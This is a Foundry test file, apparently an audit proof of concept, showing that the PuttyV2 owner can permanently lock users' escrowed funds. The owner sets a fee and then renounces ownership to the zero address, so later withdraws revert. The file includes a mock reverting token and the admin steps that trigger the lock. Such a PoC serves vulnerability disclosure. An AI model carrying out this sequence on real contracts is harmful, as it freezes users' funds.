// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";

import "src/PuttyV2.sol";
import "../shared/Fixture.t.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating that the PuttyV2 owner can brick all withdraws by
 *         setting the fee > 0 and then transferring ownership to the zero
 *         address. When a user later tries to withdraw their escrowed strike
 *         amount, PuttyV2 attempts to transfer the fee to `owner()` (now the
 *         zero address).  Many ERC20 implementations – including OpenZeppelin's
 *         reference implementation used in this test – revert on transfers to
 *         the zero address, which in turn causes the whole withdraw call to
 *         revert and permanently lock user funds in the contract.
 */
contract RevertingERC20 {
    string public name = "Reverting Token";
    string public symbol = "RVT";
    uint8 public decimals = 18;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(to != address(0), "ZERO_ADDR");
        if (from != msg.sender) {
            uint256 allowed = allowance[from][msg.sender];
            require(allowed >= amount, "NOT_ALLOWED");
            if (allowed != type(uint256).max) {
                allowance[from][msg.sender] = allowed - amount;
            }
        }
        require(balanceOf[from] >= amount, "INSUFFICIENT_BAL");
        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        require(to != address(0), "ZERO_ADDR");
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

contract ExploitTest is Fixture {
    RevertingERC20 internal rvToken;

    // Convenience constants
    uint256 constant STRIKE    = 1 ether;      // Amount maker escrows
    uint256 constant PREMIUM   = 0.01 ether;   // Amount taker pays maker
    uint256 constant DURATION  = 10 days;      // Option duration

    function setUp() public {
        // Call parent constructor logic
        // (Fixture has no setUp(), only constructor, so nothing to override).

        // Deploy ERC20 that reverts on transfers to the zero address
        rvToken = new RevertingERC20();

        // Mint balances used in the scenario
        rvToken.mint(babe, STRIKE + PREMIUM);       // Maker needs strike + a bit extra
        rvToken.mint(address(this), PREMIUM);       // Taker pays the premium

        // Label for nicer traces
        vm.label(address(rvToken), "RVT (reverting token)");

        // --- Malicious admin actions --- //
        //  1. Charge a small fee so the fee transfer path is taken
        //  2. Renounce ownership so `owner()` is now address(0)
        p.setFee(10);          // 1% fee granularity 0.1% (10 / 1000)
        p.renounceOwnership(); // owner() == address(0)

        // Sanity check – owner must now be zero
        assertEq(p.owner(), address(0), "Owner should be zero after renounce");
    }

    /// @notice Builds a minimal short put order that is sufficient to hit the
    ///         vulnerable withdraw branch where strike -> owner + user.
    function _buildShortPutOrder() internal view returns (PuttyV2.Order memory order) {
        order.maker      = babe;      // Maker writes (is short) the option
        order.isCall     = false;     // Put option
        order.isLong     = false;     // Short side (writer)
        order.baseAsset  = address(rvToken);
        order.strike     = STRIKE;
        order.premium    = PREMIUM;
        order.duration   = DURATION;
        order.expiration = block.timestamp + 30 days; // Plenty of time
        order.nonce      = 1;
        // leave whitelist/floorTokens/assets empty for simplicity
    }

    /// @notice PoC – user funds get permanently locked.
    function testWithdrawRevertsAfterOwnerRenounce() public {
        ///////////////////////////////
        // 1. Arrange – fill order  //
        ///////////////////////////////

        // Build & sign the order
        PuttyV2.Order memory order = _buildShortPutOrder();
        bytes memory sig = signOrder(babePrivateKey, order);

        // --- Approvals ---
        vm.startPrank(babe); // maker context
        rvToken.approve(address(p), STRIKE); // allow PuttyV2 to pull strike
        vm.stopPrank();

        rvToken.approve(address(p), PREMIUM); // taker approves premium

        // Fill the order – maker now has short position, strike is escrowed in PuttyV2
        p.fillOrder(order, sig, new uint256[](0));

        // Warp past option expiration so writer can withdraw
        vm.warp(block.timestamp + DURATION + 1);

        ////////////////////////////////////////////////////////
        // 2. Act + Assert – withdraw reverts for the writer   //
        ////////////////////////////////////////////////////////

        vm.startPrank(babe); // writer tries to withdraw strike
        vm.expectRevert("TRANSFER_FAILED");
        p.withdraw(order);   // <-- reverts; funds are now stuck forever
        vm.stopPrank();
    }
}
